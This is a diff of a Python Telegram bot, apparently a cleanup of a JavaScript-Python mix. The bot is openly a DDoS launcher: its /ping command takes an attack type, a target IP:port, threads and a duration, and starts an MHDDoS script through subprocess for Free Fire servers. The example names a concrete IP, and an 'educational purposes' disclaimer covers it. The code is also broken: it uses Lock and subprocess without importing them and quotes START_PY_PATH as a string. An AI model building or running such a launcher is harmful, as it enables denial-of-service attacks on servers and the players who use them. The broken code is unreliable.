@@ -1,77 +1,56 @@
-```python
 import telebot
-import subprocess
-import sqlite3
 from datetime import datetime, timedelta
-from threading import Lock
 import time
+import sqlite3
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import readline
-import chalk
-import gradient
-import figlet
-import axios
-import fs
-import path
+
+# Definir variables globales necesarias
+ADMIN_ID = 123456789  # Reemplaza con el ID de tu administrador
+db_lock = Lock()
+cooldowns = {}
+active_attacks = {}
 
 # Función para mostrar el tutorial de obtención del token
 def mostrarTutorial():
-    print(chalk.yellowBright("\nTutorial para obtener el token de bot de Telegram:"))
+    print("Tutorial para obtener el token de bot de Telegram:")
     print("1. Abre Telegram y busca 'BotFather'.")
     print("2. Inicia una conversación con BotFather y sigue las instrucciones para crear un nuevo bot.")
     print("3. Una vez creado, copia el token generado y pégalo cuando se solicite.\n")
 
 # Función para pedir el token
 def pedirToken():
-    return new Promise((resolve) => {
-        rl.question("Por favor, ingresa tu token de bot de Telegram: ", (token) => {
-            resolve(token.trim())
-        })
-    })
+    return input("Por favor, ingresa tu token de bot de Telegram: ").strip()
 
 # Función para validar el token
-async def validarToken(token):
+def validarToken(token):
     try:
         bot = telebot.TeleBot(token)
-        await bot.get_me()  # Intenta conectarte a la API de Telegram con el token proporcionado
-        print(chalk.greenBright("Token válido. Iniciando el bot...\n"))
+        bot.get_me()  # Intenta conectarse a la API de Telegram con el token proporcionado
+        print("Token válido. Iniciando el bot...\n")
         return True
-    except error:
-        print(chalk.redBright("Token inválido. Intenta nuevamente.\n"))
+    except Exception as error:
+        print("Token inválido. Intenta nuevamente.\n")
         return False
 
 # Función para obtener el token
-async def obtenerToken():
+def obtenerToken():
     while True:
-        await mostrarMenu()
-        
-        opcion = await new Promise((resolve) => {
-            rl.question(chalk.bold.magentaBright('---> '), (input) => {
-                resolve(input.trim())
-            })
-        })
+        mostrarTutorial()
+        opcion = input("---> ").strip()
 
-        if opcion === '1':
+        if opcion == '1':
             mostrarTutorial()
-            await new Promise(resolve => setTimeout(resolve, 3000))  # Espera 3 segundos después del tutorial
-
-        if opcion === '2':
-            token = await pedirToken()
-            esValido = await validarToken(token)
-
-            if esValido:
+        elif opcion == '2':
+            token = pedirToken()
+            if validarToken(token):
                 return token
-        else if opcion !== '1' && opcion !== '2':
-            print(chalk.redBright("Opción no válida. Por favor, selecciona 1 o 2.\n"))
+        else:
+            print("Opción no válida. Por favor, selecciona 1 o 2.")
 
 # Iniciar el bot con el token válido
-async def iniciarBot():
-    token = await obtenerToken()
-    
-    # Mostrar los mensajes una vez que el token es válido
-    print(chalk.blue('Iniciando✨...'))
-    print(gradient.pastel.multiline(figlet.textSync('Alfa TG', { horizontalLayout: 'default' })))
-    print(chalk.green('CREADOR EliasarYT: puro nica papa'))
+def iniciarBot():
+    token = obtenerToken()
+    print("Iniciando...")
 
     bot = telebot.TeleBot(token)
 
@@ -104,29 +83,17 @@ async def iniciarBot():
         button = InlineKeyboardButton(
             text="💻 SUPORTE - OFICIAL 💻",
             url=f"tg://user?id={ADMIN_ID}"
-
         )
         markup.add(button)
         
         bot.reply_to(
             message,
-            (
-                "🤖 *Bem-vindo ao Bot de Ping MHDDoS [Free Fire]!*"
-                
-
-                f"""
-```
-{vip_status}```\n"""
-                "📌 *Como usar:*"
-                """
-```
-// /ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>
-                "💡 *Exemplo:*"
-                """
-```
-/ping UDP 143.92.125.230:10013 10 900```\n"""
-                "⚠️ *Atenção:* Este bot foi criado apenas para fins educacionais."
-            ),
+            f"🤖 *Bem-vindo ao Bot de Ping MHDDoS [Free Fire]!*\n\n```\n{vip_status}```\n"
+            "📌 *Como usar:*\n"
+            "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+            "💡 *Exemplo:*\n"
+            "`/ping UDP 143.92.125.230:10013 10 900`\n\n"
+            "⚠️ *Atenção:* Este bot foi criado apenas para fins educacionais.",
             reply_markup=markup,
             parse_mode="Markdown",
         )
@@ -207,7 +174,7 @@ async def iniciarBot():
         ip_port = args[2]
         threads = args[3]
         duration = args[4]
-        command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
+        command = ["python", "START_PY_PATH", attack_type, ip_port, threads, duration]
 
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         active_attacks[telegram_id] = process
@@ -264,4 +231,3 @@ async def iniciarBot():
 
 # Llamar a la función para iniciar el bot
 iniciarBot()
-```
